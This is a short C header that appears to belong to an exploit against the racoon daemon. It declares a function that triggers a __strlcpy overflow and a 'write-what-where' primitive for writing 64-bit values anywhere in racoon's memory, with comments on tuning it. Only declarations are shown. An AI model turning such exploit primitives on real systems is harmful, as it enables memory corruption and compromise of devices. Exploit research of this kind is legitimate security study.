#include "common.h"
#ifndef RACOON_WWW_H
#define RACOON_WWW_H

#define RACOON_YY_BUF_SIZE 16384 // the size of the buffer that gets loaded by racoon when doing one read (after that racoon will switch buffers and this shouldn't happen between two test iterations)
#define BYTES_PER_WRITE 400 // approx amount of bytes we need for one 64-bit write FIXME: this can be prob way lower than 400
#define shift_mask(value,shift,mask) ((value >> shift) & mask)
#define shiftm(value,shift) shift_mask(value,shift,0xff)

void trigger_exec(int fd,uint32_t padding, uint64_t address); // function that triggers the __strlcpy call
void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what); // function used to write a 64 bit value anywhere in racoons memory (this can be enlared to a much bigger write as xerub showed in acron and you should prob do that to safe space in the conf file and with that get faster load times)

#endif
